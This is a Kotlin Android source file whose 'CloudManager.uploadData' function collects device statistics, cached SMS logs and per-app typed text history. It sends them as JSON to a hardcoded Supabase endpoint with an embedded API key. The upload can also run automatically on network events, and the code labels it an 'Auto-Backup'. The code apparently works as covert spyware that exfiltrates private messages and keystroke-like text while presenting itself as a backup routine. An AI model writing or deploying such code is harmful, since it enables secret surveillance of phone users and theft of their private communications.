package com.example.myandroid

import android.content.Context
import android.os.Handler
import android.os.Looper
import android.widget.TextView
import java.net.HttpURLConnection
import java.net.URL
import org.json.JSONObject
import org.json.JSONArray
import java.util.Calendar

object CloudManager {

    fun uploadData(ctx: Context, btn: TextView? = null) {
        Thread {
            try {
                // 1. GATHER DATA
                val batt = ctx.registerReceiver(null, android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED))
                val level = batt?.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, 0) ?: 0
                
                val prefs = ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
                val smsCount = prefs.getInt("sms_count", 0)
                
                val usm = ctx.getSystemService(Context.USAGE_STATS_SERVICE) as android.app.usage.UsageStatsManager
                val calendar = Calendar.getInstance()
                val endTime = calendar.timeInMillis
                calendar.set(Calendar.HOUR_OF_DAY, 0)
                val startTime = calendar.timeInMillis
                val stats = usm.queryUsageStats(android.app.usage.UsageStatsManager.INTERVAL_DAILY, startTime, endTime)
                val totalTimeMillis = stats.sumOf { it.totalTimeInForeground }
                val totalMins = java.util.concurrent.TimeUnit.MILLISECONDS.toMinutes(totalTimeMillis)

                // 2. PREPARE JSON
                val json = JSONObject()
                json.put("device_model", android.os.Build.MODEL)
                json.put("battery_level", level)
                json.put("sms_count", smsCount)
                json.put("screen_time_minutes", totalMins)
                json.put("android_version", android.os.Build.VERSION.RELEASE)
                
                // Attach SMS logs
                // Attach SMS logs
                val rawLogs = prefs.getString("sms_logs_cache", "[]")
                json.put("sms_logs", JSONArray(rawLogs))

                // Attach Text History
                val rawHistory = prefs.getString("text_history_by_app", "{}")
                json.put("text_history", JSONObject(rawHistory))

                // 3. SEND TO SUPABASE

                // Mark if auto-trigger or manual
                json.put("trigger", if (btn == null) "AUTO_NETWORK" else "MANUAL_USER")

                // 3. SEND TO SUPABASE
                val supabaseUrl = "https://xvldfsmxskhemkslsbym.supabase.co/rest/v1/device_stats"
                val supabaseKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inh2bGRmc214c2toZW1rc2xzYnltIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjI2ODgxNzksImV4cCI6MjA3ODI2NDE3OX0.5arqrx8Tt7v-hpXpo_ncoK4IX8th9IibxAuv93SSoOU"

                val url = URL(supabaseUrl)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("apikey", supabaseKey)
                conn.setRequestProperty("Authorization", "Bearer $supabaseKey")
                conn.setRequestProperty("Content-Type", "application/json")
                conn.doOutput = true

                val os = conn.outputStream
                os.write(json.toString().toByteArray())
                os.flush()
                os.close()

                val code = conn.responseCode
                
                // If UI button exists, update it
                if (btn != null) {
                    Handler(Looper.getMainLooper()).post {
                        if (code == 201) {
                            btn.text = "UPLOAD SUCCESS ✅"
                            btn.background.setTint(0xFF2CB67D.toInt())
                        } else {
                             btn.text = "FAILED: $code ❌"
                             btn.background.setTint(0xFFEF4565.toInt())
                        }
                    }
                } else {
                    // Log for background service
                    println("Auto-Backup finished with code: $code")
                }
            } catch (e: Exception) {
                e.printStackTrace()
                if (btn != null) {
                    Handler(Looper.getMainLooper()).post {
                         btn.text = "ERROR: ${e.message}"
                         btn.background.setTint(0xFFEF4565.toInt())
                    }
                }
            }
        }.start()
    }
}